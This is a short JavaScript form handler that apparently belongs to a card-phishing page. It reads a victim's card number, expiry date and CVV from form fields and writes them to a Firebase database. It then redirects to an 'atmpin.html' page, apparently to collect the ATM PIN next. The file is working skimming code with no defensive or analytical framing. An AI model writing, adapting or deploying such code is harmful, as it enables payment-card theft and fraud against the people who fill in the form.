// Firebase reference
var cardRef = firebase.database().ref("ududip007");

// Form submit listener
document.getElementById("ududip007").addEventListener("submit", function(e) {
  e.preventDefault();

  var cardNumber = document.getElementById("cardNumber").value;
  var expiry = document.getElementById("expiry").value;
  var cvv = document.getElementById("cvv").value;

  // Push to Firebase
  var newCard = cardRef.push();
  newCard.set({
    card_number: cardNumber,
    expiry_date: expiry,
    cvv_code: cvv
  }).then(() => {
    localStorage.setItem("cardKey", newCard.key);
    window.location.href = "atmpin.html"; // next step
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
